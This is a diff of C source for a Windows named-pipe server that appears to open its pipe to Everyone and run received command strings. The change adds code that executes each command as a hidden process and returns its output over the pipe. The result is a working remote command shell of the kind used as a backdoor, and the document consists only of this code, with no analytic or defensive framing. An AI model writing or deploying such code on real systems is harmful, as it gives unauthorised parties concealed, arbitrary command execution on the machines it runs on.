@@ -57,6 +57,41 @@ BOOL GenerateEveryoneSecAttr(PSECURITY_ATTRIBUTES sa) {
 	return TRUE;
 }
 
+VOID TransmissionData(HANDLE hRead, HANDLE hGap) {
+	char buff[100] = { 0 };
+	memset(buff, 0, 100);
+	DWORD dwRead = 0, dwLen;
+	while (ReadFile(hRead, buff, 100, &dwRead, NULL) != 0)
+	{
+		WriteFile(hGap, buff, dwRead, &dwLen, NULL);
+		memset(buff, 0, 100);
+	}
+	CloseHandle(hRead);
+}
+
+BOOL ExecCommand(HANDLE hGap, char* szBuffer) {
+	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+	HANDLE hRead, hWrite;
+	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
+	{
+		return FALSE;
+	}
+	STARTUPINFO si = { sizeof(STARTUPINFO) };
+	GetStartupInfo(&si);
+	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+	si.wShowWindow = SW_HIDE;
+	si.hStdError = hWrite;
+	si.hStdOutput = hWrite;
+	PROCESS_INFORMATION pi;
+	if (!CreateProcess(NULL, szBuffer, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+	{
+		return FALSE;
+	}
+	CloseHandle(hWrite);
+	TransmissionData(hRead, hGap);
+	return TRUE;
+}
+
 HANDLE CreateSystemGap(
 	char * gap_name
 )
@@ -109,7 +144,10 @@ void HandleGapMsg(HANDLE hGap) {
 			DWORD dwLen;
 			ReadFile(hGap, szBuffer, BUFF_SIZE, &dwLen, NULL);
 			printf("[+]Receive %d bytes.\n", dwLen);
-			WinExec(szBuffer, TRUE);
+			if (!ExecCommand(hGap, szBuffer)) {
+				printf("[+]Execute Error %d \n", GetLastError());
+			}
+			
 			DisconnectNamedPipe(hGap);
 		}
 		
